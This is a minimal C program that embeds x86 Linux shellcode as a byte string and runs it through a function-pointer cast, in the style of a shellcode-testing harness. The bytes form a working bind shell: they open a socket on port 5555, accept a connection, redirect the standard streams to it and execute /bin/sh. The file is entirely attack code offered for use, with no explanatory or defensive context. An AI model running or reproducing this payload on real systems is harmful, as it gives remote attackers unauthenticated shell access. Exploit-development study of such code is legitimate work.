#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\x31\xc0\x89\xc3\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1"
"\xcd\x80\x89\xc2\x31\xc0\x50\xb0\x66\xb3\x02\x66\x68\x15\xb3"
"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x31\xc0"
"\x50\xb0\x66\xb3\x04\x52\x89\xe1\xcd\x80\x31\xc0\x50\x50\x52"
"\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0"
"\x3f\xfe\xc9\xcd\x80\x79\xf8\x31\xc0\x50\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(shellcode));

        int (*ret)() = (int(*)())shellcode;

        ret();

}